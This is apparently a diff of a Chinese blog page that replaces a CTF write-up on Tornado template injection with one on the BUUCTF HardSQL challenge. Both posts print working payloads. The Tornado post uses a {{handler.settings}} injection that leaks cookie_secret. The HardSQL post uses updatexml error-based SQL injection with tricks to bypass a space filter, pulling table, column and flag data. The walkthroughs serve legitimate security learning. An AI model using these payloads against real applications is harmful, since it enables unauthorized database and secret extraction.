@@ -19,33 +19,33 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="buuctf 20-[护网杯 2018]easy_tornado">
+    <meta name="description" content="buuctf [极客大挑战 2019]HardSQ">
 <meta property="og:type" content="article">
-<meta property="og:title" content="buuctf 20-[护网杯 2018]easy_tornado">
-<meta property="og:url" content="http://example.com/2023/02/07/buuctf%2020-[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado/index.html">
+<meta property="og:title" content="buuctf 25-[极客大挑战 2019]HardSQL">
+<meta property="og:url" content="http://example.com/2023/02/17/buuctf-25-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/index.html">
 <meta property="og:site_name" content="Have a good day !">
-<meta property="og:description" content="buuctf 20-[护网杯 2018]easy_tornado">
+<meta property="og:description" content="buuctf [极客大挑战 2019]HardSQ">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675756604678-a5456111-2076-4eaf-ae2d-bd9ce5d42667.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675756826374-c74203e6-93e6-404e-b2da-d2ced85d955a.png">
-<meta property="article:published_time" content="2023-02-07T14:22:01.000Z">
-<meta property="article:modified_time" content="2023-02-07T14:59:36.203Z">
+<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675851040686-ef7c89fe-a5b4-48ba-bbe6-ce9474f3177b.png">
+<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675851059383-7ac1fac1-58b4-4600-97a1-042396d32b21.png">
+<meta property="article:published_time" content="2023-02-17T13:46:26.000Z">
+<meta property="article:modified_time" content="2023-02-17T13:48:22.091Z">
 <meta property="article:author" content="Z1d10t">
-<meta property="article:tag" content="render渲染">
-<meta property="article:tag" content="python">
-<meta property="article:tag" content="环境变量">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="报错注入">
+<meta property="article:tag" content="空格绕过">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675756604678-a5456111-2076-4eaf-ae2d-bd9ce5d42667.png">
+<meta name="twitter:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675851040686-ef7c89fe-a5b4-48ba-bbe6-ce9474f3177b.png">
 
 
-<link rel="canonical" href="http://example.com/2023/02/07/buuctf%2020-[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado/">
+<link rel="canonical" href="http://example.com/2023/02/17/buuctf-25-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/02/07/buuctf%2020-[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado/","path":"2023/02/07/buuctf 20-[护网杯 2018]easy_tornado/","title":"buuctf 20-[护网杯 2018]easy_tornado"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/02/17/buuctf-25-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/","path":"2023/02/17/buuctf-25-极客大挑战-2019-HardSQL/","title":"buuctf 25-[极客大挑战 2019]HardSQL"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>buuctf 20-[护网杯 2018]easy_tornado | Have a good day !</title>
+<title>buuctf 25-[极客大挑战 2019]HardSQL | Have a good day !</title>
   
 
 
@@ -173,7 +173,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/07/buuctf%2020-[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/17/buuctf-25-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/a.png">
@@ -186,12 +186,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="buuctf 20-[护网杯 2018]easy_tornado | Have a good day !">
+      <meta itemprop="name" content="buuctf 25-[极客大挑战 2019]HardSQL | Have a good day !">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          buuctf 20-[护网杯 2018]easy_tornado
+          buuctf 25-[极客大挑战 2019]HardSQL
         </h1>
 
         <div class="post-meta-container">
@@ -203,7 +203,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-02-07 22:22:01 / 修改时间：22:59:36" itemprop="dateCreated datePublished" datetime="2023-02-07T22:22:01+08:00">2023-02-07</time>
+      <time title="创建时间：2023-02-17 21:46:26 / 修改时间：21:48:22" itemprop="dateCreated datePublished" datetime="2023-02-17T21:46:26+08:00">2023-02-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -232,33 +232,46 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>buuctf 20-[护网杯 2018]easy_tornado</p>
-<span id="more"></span>
+        <p>buuctf [极客大挑战 2019]HardSQ</p>
+<span id="more"></span>s
 
-<p>这是一道毫无头绪的题目，就当作学习了。</p>
-<p>进入之后有三个页面内容分别为：</p>
-<p>flag in /fllllllllllllag</p>
-<p>render</p>
-<p>md5(cookie_secret+md5(filename))</p>
-<p>发现请求过程很奇怪</p>
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675756604678-a5456111-2076-4eaf-ae2d-bd9ce5d42667.png" alt="img"></p>
-<p>通过filename请求一个文件然后filehash请求一个哈西值 也就是加密了一下</p>
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675756826374-c74203e6-93e6-404e-b2da-d2ced85d955a.png" alt="img"></p>
-<p>如果不请求哈希值试一下 直接报错，并且注意：<code>/error?msg=Error</code>直接来看大佬的wp</p>
-<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。
+<p>这个题目是报错注入的典型，值得记录一下</p>
+<p>简单尝试之后常见的字符比如空格 union都被黑名单了 尝试用/**/绕过空格但还是不行，只能用（）来绕过空格</p>
+<p>这里测试空格是否被河蟹 不能通过1’加空格 这样测试是不对的</p>
+<p>最好是用<code>1&#39; #</code>这样测试比较正确，因为一般题目不会河蟹#字符</p>
+<p>空格绕过的原理： 括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格  </p>
+<p>so 所以只能用报错注入了，这里就好好回顾一下报错注入</p>
+<p>一般报错注入分为两个函数：updatexml() 与extractvalue()</p>
+<p>就拿updatexml举例 他们两的差别就只是传参上</p>
+<p><code>updatexml(1，2，3)</code>函数总共有三个参数，当第二个参数有特殊符号时，就会触发数据库报错，而且将参数2的内容显示在报错信息中，常用是<code>~</code>他的十六进制用<code>0x7e</code>表示</p>
+<p>然后，报错注入常用拼接函数 concat和group_concat</p>
+<p><code>concat</code>和<code>group_concat</code>都是用在sql语句中做拼接使用的，但是两者使用的方式不尽相同，<code>concat</code>是针对以行数据做的拼接，而<code>group_concat</code>是针对列做的数据拼接，且<code>group_concat</code>自动生成逗号。</p>
+<p>所以格式一般为：<code>updatexml(1,concat(0x7e,sql语句,0x7e),1)</code></p>
+<p>然而，<code>extractvalue(1，2</code>)只有两个参数，当第二个参数具有特殊符号时，则会报错。</p>
+<p>格式为：<code>extractvalue( 1,concat(0x7e,sql语句))</code></p>
+<p>回到题目：</p>
+<p>其实题目本身就是考察报错注入与绕过空格 这里就简单谢谢payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure>
 
-Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快
+<p>XPATH syntax error: ‘<del>geek</del>‘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))#</span><br></pre></td></tr></table></figure>
 
-在tornado模板中，存在一些可以访问的快速对象,这里用到的是`handler.settings`，`handler`指向`RequestHandler`，而`RequestHandler.settings`又指向`self.application.settings`，所以handler.settings就指向`RequestHandler.application.settings`了，这里面就是我们的一些环境变量.
+<p>XPATH syntax error: ‘<del>H4rDsq1</del>‘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br></pre></td></tr></table></figure>
 
-然后通过环境变量去获取`cookie_secret`
+<p>XPATH syntax error: ‘<del>id,username,password</del>‘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>
 
-构造payload ：/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
-<p>得到：<code>&#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;76a26309-3853-4c68-b91e-eee75246e722&#39;&#125;</code></p>
-<p>发现了<code>cookie_secret </code></p>
-<p>之后将<code>/fllllllllllllag</code>加密一下将<code>cookie_secret</code> 加上 再进行一次md5加密就可以获得flag了</p>
-<p>构造payload：<code>?filename=/fllllllllllllag&amp;filehash=99d14d071426405f00eca73ec4a5eb64</code></p>
-<p>成功！</p>
+<p>XPATH syntax error: ‘~1flagflag{9804c176-72e3-46d2-90’</p>
+<p>这里flag显示的不完全，用到left 和 right函数</p>
+<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675851040686-ef7c89fe-a5b4-48ba-bbe6-ce9474f3177b.png" alt="img"></p>
+<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675851059383-7ac1fac1-58b4-4600-97a1-042396d32b21.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<p>XPATH syntax error: ‘~04c176-72e3-46d2-902b-0e79f4ea1’</p>
+<p>查询到其余的flag</p>
+<p>因为还河蟹了= 所以用了like语句</p>
+<p>完成！</p>
 
     </div>
 
@@ -276,7 +289,7 @@ Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://example.com/2023/02/07/buuctf%2020-[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado/" title="buuctf 20-[护网杯 2018]easy_tornado">http://example.com/2023/02/07/buuctf 20-[护网杯 2018]easy_tornado/</a>
+      <a href="http://example.com/2023/02/17/buuctf-25-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/" title="buuctf 25-[极客大挑战 2019]HardSQL">http://example.com/2023/02/17/buuctf-25-极客大挑战-2019-HardSQL/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -285,22 +298,22 @@ Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流
 </div>
 
           <div class="post-tags">
-              <a href="/tags/render%E6%B8%B2%E6%9F%93/" rel="tag"># render渲染</a>
-              <a href="/tags/python/" rel="tag"># python</a>
-              <a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" rel="tag"># 环境变量</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+              <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag"># 报错注入</a>
+              <a href="/tags/%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" rel="tag"># 空格绕过</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2023/02/07/buuctf-18-RoarCTF-2019-Easy-Calc/" rel="prev" title="buuctf 18-[RoarCTF 2019]Easy Calc">
-                  <i class="fa fa-chevron-left"></i> buuctf 18-[RoarCTF 2019]Easy Calc
+                <a href="/2023/02/17/buuctf-22-admin/" rel="prev" title="buuctf 22-admin">
+                  <i class="fa fa-chevron-left"></i> buuctf 22-admin
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/02/17/buuctf-21-BJDCTF2020-Easy-MD5/" rel="next" title="buuctf 21-[BJDCTF2020]Easy MD5">
-                  buuctf 21-[BJDCTF2020]Easy MD5 <i class="fa fa-chevron-right"></i>
+                <a href="/2023/02/17/buuctf-29-GXYCTF2019-BabySQli/" rel="next" title="buuctf 29-[GXYCTF2019]BabySQli">
+                  buuctf 29-[GXYCTF2019]BabySQli <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
